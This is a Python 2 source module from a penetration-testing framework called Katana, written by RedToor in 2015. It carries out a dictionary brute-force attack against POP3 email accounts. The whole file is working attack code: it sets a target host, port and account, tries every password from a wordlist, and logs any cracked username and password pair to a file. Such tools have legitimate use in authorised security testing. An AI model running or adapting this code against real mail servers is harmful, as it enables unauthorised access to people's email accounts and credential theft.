# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Brute Force POP#
# Script by : RedToor        #
# Date      : 22/05/2015     #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core import help        #
from core import ping        #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import time                  #
import poplib                #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaulthost="127.0.0.1"
defaultport="110"
defaultaccount="admin@127.0.0.1"
defaultdicc="core/db/pass.dicc"
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(para,parb,parc,pard):
	global defaulthost,defaultport,defaultdicc
	defaulthost=para
	defaultport=parb
	defaultaccount=parc
	defaultdicc=pard
	btpop3(1)

def btpop3(run):
	try:
		global defaulthost,defaultport,defaultdicc,defaultaccount
		if run!=1:
			actions=raw_input(d.prompt("bt/pop3"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
			d.descrip("email","yes","Account ",defaultaccount)
			d.descrip("dict_1","yes","Dictionary pass",defaultdicc)
			print ""
			btpop3(0)
		elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			d.change("target",defaulthost)
			btpop3(0)
		elif actions[0:8] == "set port":
			defaultport = actions[9:]
			d.change("port",defaultport)
			btpop3(0)
		elif actions[0:9] == "set email":
			defaultaccount = actions[10:]
			d.change("email",defaultaccount)
			btpop3(0)
		elif actions[0:10] == "set dict_1":
			defaultdicc = actions[11:]
			d.change("dict_1",defaultdicc)
			btpop3(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				red=poplib.POP3(defaulthost, defaultport)
				if True:
					try:
						d.loading()
						try:
							with open(defaultdicc,'r') as passs:
								for ps in passs: 
									ps=ps.replace("\n","")
									try:
										red.user(defaultaccount)
										red.pass_(ps)
										if True:
											log=open('core/logs/logsBruteForce.log','a')
											log.write('\n ===================================== ')
											log.write('\n Module  : BruteForcePOP3')
											log.write('\n Data    : '+time.strftime('%c'))
											log.write('\n target  : '+defaulthost)
											log.write('\n port    : '+defaultport)
											log.write('\n account : '+defaultaccount)
											log.write('\n Cracked : username : '+defaultaccount+' , password : '+ps)
											log.close()
											print "\n-["+colors[2]+"*"+colors[0]+"] Successfully with ("+defaultaccount+"="+ps+")\n"
											btpop3(0)
									except:
										print " ["+colors[4]+"!"+colors[0]+"] Checking ("+defaultaccount+"="+ps+")"
						except:
							d.filenot(defaultdicc)
							btpop3(0)
					except:
						d.kbi()
			except:
				d.off()
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	btpop3(0)